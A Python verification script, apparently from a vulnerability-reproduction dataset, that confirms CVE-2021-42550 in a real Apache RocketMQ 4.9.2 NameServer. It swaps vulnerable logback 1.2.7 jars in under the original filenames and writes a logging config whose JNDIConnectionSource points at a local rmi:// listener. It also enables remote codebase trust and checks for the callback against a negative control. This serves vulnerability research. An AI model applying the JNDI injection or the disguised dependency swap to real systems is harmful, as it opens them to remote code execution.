#!/usr/bin/env python3
import argparse
import hashlib
import json
import os
import shutil
import signal
import socket
import subprocess
import threading
import time
import zipfile
from pathlib import Path


SAMPLE_ID = "CVE-2021-42550__apache_rocketmq_4_9_2_v1_logback_real_entrypoint"
ROOT = Path("/data/lhq/workspace/ljl-v1-downstream-insertions")
LEGACY_ROOT = Path("/data/lhq/workspace/ljl-strict-redo")
ARCHIVE = LEGACY_ROOT / "historical-scan" / "rocketmq-all-4.9.2-bin-release.zip"
SOURCE_CASE = "logback/CVE-2021-42550"
SOURCE_V1 = Path("/data/lhq/workspace/ljl-patch-java30-projects/input/logback/CVE-2021-42550/v1")
V1_LOGBACK_CORE = ROOT / "vendor-m2/ch/qos/logback/logback-core/1.2.7/logback-core-1.2.7.jar"
AUX_LOGBACK_CLASSIC = ROOT / "vendor-m2/ch/qos/logback/logback-classic/1.2.7/logback-classic-1.2.7.jar"
JAVA8 = Path("/data/lhq/.sdkman/candidates/java/8.0.452-amzn")
DIST_NAME = "rocketmq-4.9.2"
TARGET_CORE_NAME = "logback-core-1.0.13.jar"
TARGET_CLASSIC_NAME = "logback-classic-1.0.13.jar"


def sha256(path):
    digest = hashlib.sha256()
    with Path(path).open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def inspect_logback_jar(jar_path, artifact):
    jar_path = Path(jar_path)
    result = {
        "path": str(jar_path),
        "exists": jar_path.exists(),
        "version": None,
        "jndi_connection_source_class_present": False,
    }
    if not jar_path.exists():
        return result
    with zipfile.ZipFile(jar_path) as zf:
        names = set(zf.namelist())
        result["jndi_connection_source_class_present"] = (
            "ch/qos/logback/core/db/JNDIConnectionSource.class" in names
        )
        props = f"META-INF/maven/ch.qos.logback/{artifact}/pom.properties"
        if props in names:
            for line in zf.read(props).decode("utf-8", "replace").splitlines():
                if line.startswith("version="):
                    result["version"] = line.split("=", 1)[1]
    return result


def ensure_distribution(sample_dir, case_name):
    if not ARCHIVE.exists():
        raise FileNotFoundError(ARCHIVE)
    run_root = sample_dir / f"{case_name}-runtime"
    if run_root.exists():
        shutil.rmtree(run_root)
    run_root.mkdir(parents=True)
    with zipfile.ZipFile(ARCHIVE) as zf:
        zf.extractall(run_root)
    dist = run_root / DIST_NAME
    if not dist.exists():
        raise FileNotFoundError(dist)
    for script in (dist / "bin").glob("*"):
        if script.is_file():
            script.chmod(script.stat().st_mode | 0o111)
    return dist


def insert_v1_logback(dist):
    if not V1_LOGBACK_CORE.exists():
        raise FileNotFoundError(V1_LOGBACK_CORE)
    if not AUX_LOGBACK_CLASSIC.exists():
        raise FileNotFoundError(AUX_LOGBACK_CLASSIC)

    core_target = dist / "lib" / TARGET_CORE_NAME
    classic_target = dist / "lib" / TARGET_CLASSIC_NAME
    if not core_target.exists():
        raise FileNotFoundError(core_target)
    if not classic_target.exists():
        raise FileNotFoundError(classic_target)

    before = {
        TARGET_CORE_NAME: {
            "target_path": str(core_target),
            "sha256_before": sha256(core_target),
            "inspection_before": inspect_logback_jar(core_target, "logback-core"),
        },
        TARGET_CLASSIC_NAME: {
            "target_path": str(classic_target),
            "sha256_before": sha256(classic_target),
            "inspection_before": inspect_logback_jar(classic_target, "logback-classic"),
        },
    }

    shutil.copy2(V1_LOGBACK_CORE, core_target)
    shutil.copy2(AUX_LOGBACK_CLASSIC, classic_target)

    inserted = {
        TARGET_CORE_NAME: {
            "target_path": str(core_target),
            "source_v1_runtime_jar": str(V1_LOGBACK_CORE),
            "sha256_source": sha256(V1_LOGBACK_CORE),
            "sha256_target_after": sha256(core_target),
            "inspection_after": inspect_logback_jar(core_target, "logback-core"),
            "is_generated_v1_runtime_jar": True,
            "target_filename_preserved_for_downstream_classpath": True,
        }
    }
    auxiliary = {
        TARGET_CLASSIC_NAME: {
            "target_path": str(classic_target),
            "source_auxiliary_jar": str(AUX_LOGBACK_CLASSIC),
            "sha256_source": sha256(AUX_LOGBACK_CLASSIC),
            "sha256_target_after": sha256(classic_target),
            "inspection_after": inspect_logback_jar(classic_target, "logback-classic"),
            "is_generated_v1_runtime_jar": False,
            "reason": (
                "RocketMQ 4.9.2 ships logback-classic 1.0.13, which is binary-incompatible "
                "with the inserted v1-selected logback-core 1.2.7. The matching classic jar is "
                "inserted only as a compatibility adapter so the real mqnamesrv entrypoint can "
                "load the vulnerable core path."
            ),
            "target_filename_preserved_for_downstream_classpath": True,
        }
    }
    jars = sorted(str(p.relative_to(dist)) for p in (dist / "lib").glob("logback-*.jar"))
    return before, inserted, auxiliary, jars


def write_dependency_evidence(evidence_dir, insertion):
    before, inserted, auxiliary, jars = insertion
    evidence = {
        "artifact": str(ARCHIVE),
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_method": (
            "isolated runtime dependency insertion: official Apache RocketMQ 4.9.2 binary "
            "with generated-v1-selected vulnerable logback-core 1.2.7 bytes copied into "
            "the original RocketMQ logback-core 1.0.13 runtime filename before invoking "
            "the real bin/mqnamesrv entrypoint; logback-classic 1.2.7 is copied into the "
            "original classic filename only as a compatibility adapter"
        ),
        "before_insertion": before,
        "inserted_v1_jars": inserted,
        "inserted_auxiliary_jars": auxiliary,
        "runtime_logback_jars_after_insertion": jars,
    }
    (evidence_dir / "dependency-evidence.json").write_text(
        json.dumps(evidence, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (evidence_dir / "dependency-evidence.txt").write_text("\n".join(jars) + "\n", encoding="utf-8")
    return evidence


def start_rmi_listener(evidence_dir, case_name, timeout=18):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (evidence_dir / f"{case_name}-rmi-port.txt").write_text(
                str(port_box["port"]) + "\n", encoding="utf-8"
            )
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append({"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)})

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError(f"RMI listener did not start for {case_name}")
    return port_box["port"], received, thread


def logback_config(jndi_location):
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<configuration debug="true">\n'
        '  <appender name="DB" class="ch.qos.logback.classic.db.DBAppender">\n'
        '    <connectionSource class="ch.qos.logback.core.db.JNDIConnectionSource">\n'
        f"      <jndiLocation>{jndi_location}</jndiLocation>\n"
        "    </connectionSource>\n"
        "  </appender>\n"
        '  <root level="INFO"><appender-ref ref="DB"/></root>\n'
        "</configuration>\n"
    )


def stop_leftovers(dist):
    subprocess.run(
        ["pkill", "-f", str(dist)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        text=True,
    )


def exercise_rocketmq(sample_dir, evidence_dir, case_name, location_factory):
    dist = ensure_distribution(sample_dir, case_name)
    insertion = insert_v1_logback(dist)
    port, received, thread = start_rmi_listener(evidence_dir, case_name)
    jndi_location = location_factory(port)
    config = dist / "conf" / "logback_namesrv.xml"
    config.write_text(logback_config(jndi_location), encoding="utf-8")
    (evidence_dir / f"{case_name}-logback_namesrv.xml").write_text(
        config.read_text(encoding="utf-8"), encoding="utf-8"
    )

    env = os.environ.copy()
    env["JAVA_TOOL_OPTIONS"] = "-Dcom.sun.jndi.rmi.object.trustURLCodebase=true"
    env["JAVA_OPT_EXT"] = "-Xms128m -Xmx256m"
    if JAVA8.exists():
        env["JAVA_HOME"] = str(JAVA8)
        env["PATH"] = str(JAVA8 / "bin") + ":" + env.get("PATH", "")

    started = time.time()
    proc = subprocess.Popen(
        ["bash", "bin/mqnamesrv"],
        cwd=str(dist),
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        start_new_session=True,
    )
    timeout = False
    try:
        output, _ = proc.communicate(timeout=18)
    except subprocess.TimeoutExpired:
        timeout = True
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except ProcessLookupError:
            pass
        output, _ = proc.communicate(timeout=5)
    thread.join(18)
    stop_leftovers(dist)

    result = {
        "case": case_name,
        "entrypoint": "bin/mqnamesrv",
        "cmd": ["bash", "bin/mqnamesrv"],
        "duration_seconds": round(time.time() - started, 3),
        "jndi_location": jndi_location,
        "listener_received_count": len(received),
        "listener_received": received,
        "returncode": proc.returncode,
        "timeout": timeout,
        "java_home": env.get("JAVA_HOME"),
        "java_opt_ext": env.get("JAVA_OPT_EXT"),
        "stdout_contains_namesrv_boot": "The Name Server boot success" in output,
        "stdout_contains_namesrv_startup": "NamesrvStartup" in output or "rocketmq" in output.lower(),
        "stdout_contains_jndi_connection_source": "JNDIConnectionSource" in output,
        "stdout_tail": output[-12000:],
        "insertion": {
            "before_insertion": insertion[0],
            "inserted_v1_jars": insertion[1],
            "inserted_auxiliary_jars": insertion[2],
            "runtime_logback_jars_after_insertion": insertion[3],
        },
    }
    (evidence_dir / f"{case_name}.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    return result, insertion


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(ROOT))
    parser.add_argument("--fresh", action="store_true")
    args = parser.parse_args()

    root = Path(args.workdir)
    sample_dir = root / "samples" / SAMPLE_ID
    if args.fresh and sample_dir.exists():
        shutil.rmtree(sample_dir)
    evidence_dir = sample_dir / "evidence"
    evidence_dir.mkdir(parents=True, exist_ok=True)

    positive, positive_insertion = exercise_rocketmq(
        sample_dir,
        evidence_dir,
        "positive",
        lambda port: f"rmi://127.0.0.1:{port}/x",
    )
    dependency_evidence = write_dependency_evidence(evidence_dir, positive_insertion)
    negative, _ = exercise_rocketmq(
        sample_dir,
        evidence_dir,
        "negative",
        lambda port: "java:comp/env/jdbc/control",
    )

    inserted = dependency_evidence["inserted_v1_jars"][TARGET_CORE_NAME]
    auxiliary = dependency_evidence["inserted_auxiliary_jars"][TARGET_CLASSIC_NAME]
    confirmed = (
        positive["listener_received_count"] > 0
        and negative["listener_received_count"] == 0
        and positive["stdout_contains_namesrv_boot"]
        and negative["stdout_contains_namesrv_boot"]
        and positive["stdout_contains_jndi_connection_source"]
        and negative["stdout_contains_jndi_connection_source"]
        and inserted["inspection_after"]["version"] == "1.2.7"
        and inserted["inspection_after"]["jndi_connection_source_class_present"]
        and inserted["sha256_source"] == inserted["sha256_target_after"]
        and auxiliary["inspection_after"]["version"] == "1.2.7"
        and not auxiliary["is_generated_v1_runtime_jar"]
    )

    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "strict_status": "TP_CONFIRMED" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "downstream_repo": "apache/rocketmq",
        "downstream_application": "Apache RocketMQ 4.9.2 NameServer",
        "downstream_entrypoint": "bin/mqnamesrv",
        "downstream": "Apache RocketMQ 4.9.2",
        "attack_surface": (
            "RocketMQ NameServer's real startup script loads conf/logback_namesrv.xml; "
            "the inserted v1 logback-core resolves JNDIConnectionSource before the long-running "
            "NameServer process is terminated by the verifier"
        ),
        "cve": "CVE-2021-42550",
        "upstream_library": "logback",
        "vulnerable_version": "1.2.7",
        "artifact": str(ARCHIVE),
        "dependency_evidence": dependency_evidence,
        "dependency_evidence_file": str(evidence_dir / "dependency-evidence.json"),
        "dynamic_evidence": str(evidence_dir / "probe.json"),
        "run_rc": str(evidence_dir / "run.rc"),
        "verifier": str(root / "scripts" / "verify_rocketmq_logback_v1_inserted.py"),
        "payload": positive["jndi_location"],
        "positive": positive,
        "negative": negative,
        "dynamic_signal": {
            "positive_listener_received_count": positive["listener_received_count"],
            "positive_listener_received": positive["listener_received"],
            "positive_namesrv_boot": positive["stdout_contains_namesrv_boot"],
            "negative_listener_received_count": negative["listener_received_count"],
            "negative_listener_received": negative["listener_received"],
            "negative_namesrv_boot": negative["stdout_contains_namesrv_boot"],
        },
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "notes": (
            "The verifier does not execute the v1 App.java harness. It inserts the vulnerable "
            "logback-core 1.2.7 runtime dependency selected by logback/CVE-2021-42550/v1 into "
            "an isolated Apache RocketMQ 4.9.2 binary distribution, keeps RocketMQ's original "
            "classpath filenames, adds matching logback-classic 1.2.7 only as a compatibility "
            "adapter, then triggers JNDIConnectionSource through RocketMQ's real bin/mqnamesrv "
            "launcher and logback_namesrv.xml configuration path. The positive control receives "
            "a JRMI connection; the negative java:comp/env control receives none."
        ),
    }

    (sample_dir / "manifest.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "probe.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    listener_hex = positive["listener_received"][0].get("data_hex", "") if positive["listener_received"] else ""
    (evidence_dir / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"status={result['strict_status']}\n"
        f"positive_returncode={positive['returncode']}\n"
        f"positive_timeout={int(positive['timeout'])}\n"
        f"positive_namesrv_boot_observed={int(positive['stdout_contains_namesrv_boot'])}\n"
        f"positive_jndi_connection_source_observed={int(positive['stdout_contains_jndi_connection_source'])}\n"
        f"positive_listener_received_count={positive['listener_received_count']}\n"
        f"listener_data_hex={listener_hex}\n"
        f"negative_returncode={negative['returncode']}\n"
        f"negative_timeout={int(negative['timeout'])}\n"
        f"negative_namesrv_boot_observed={int(negative['stdout_contains_namesrv_boot'])}\n"
        f"negative_jndi_connection_source_observed={int(negative['stdout_contains_jndi_connection_source'])}\n"
        f"negative_listener_received_count={negative['listener_received_count']}\n"
        f"inserted_logback_core_version={inserted['inspection_after']['version']}\n"
        f"jndi_connection_source_class_present={int(inserted['inspection_after']['jndi_connection_source_class_present'])}\n"
        f"auxiliary_logback_classic_version={auxiliary['inspection_after']['version']}\n",
        encoding="utf-8",
    )
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "This is a strict insertion sample. The verifier unpacks the official Apache RocketMQ "
        "4.9.2 binary into isolated runtimes, copies the vulnerable logback-core 1.2.7 bytes "
        "selected by `logback/CVE-2021-42550/v1` into RocketMQ's original "
        "`logback-core-1.0.13.jar` classpath filename, copies `logback-classic-1.2.7.jar` "
        "only as a compatibility adapter into the original classic filename, writes "
        "`conf/logback_namesrv.xml`, and starts the real `bin/mqnamesrv` launcher.\n\n"
        "The positive run uses a `JNDIConnectionSource` RMI location and receives a JRMI "
        "connection. The negative run uses the same downstream startup path with "
        "`java:comp/env/jdbc/control` and receives no callback.\n\n"
        "Run: `python3 scripts/verify_rocketmq_logback_v1_inserted.py --fresh` from "
        "`/data/lhq/workspace/ljl-v1-downstream-insertions`.\n",
        encoding="utf-8",
    )

    print(json.dumps(result, indent=2, sort_keys=True))
    raise SystemExit(0 if confirmed else 1)


if __name__ == "__main__":
    main()
